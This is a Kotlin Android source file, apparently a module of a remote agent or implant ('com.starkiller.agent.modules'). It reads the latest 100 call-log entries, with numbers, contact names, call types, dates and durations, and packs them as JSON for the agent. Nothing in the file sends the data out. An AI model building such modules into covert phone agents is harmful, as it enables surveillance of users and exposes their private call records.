package com.starkiller.agent.modules

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

class CallLogReader(private val context: Context) {

    fun read(): JSONObject {
        val calls = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null,
                CallLog.Calls.DATE + " DESC LIMIT 100"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val type = when (it.getInt(2)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else -> "unknown"
                    }
                    calls.put(JSONObject().apply {
                        put("number", it.getString(0) ?: "")
                        put("name", it.getString(1) ?: "")
                        put("type", type)
                        put("date", it.getLong(3))
                        put("duration", it.getInt(4))
                    })
                }
            }
        } catch (e: SecurityException) {
            return JSONObject().put("error", "call log permission denied")
        }
        return JSONObject().apply {
            put("count", calls.length())
            put("calls", calls)
        }
    }
}
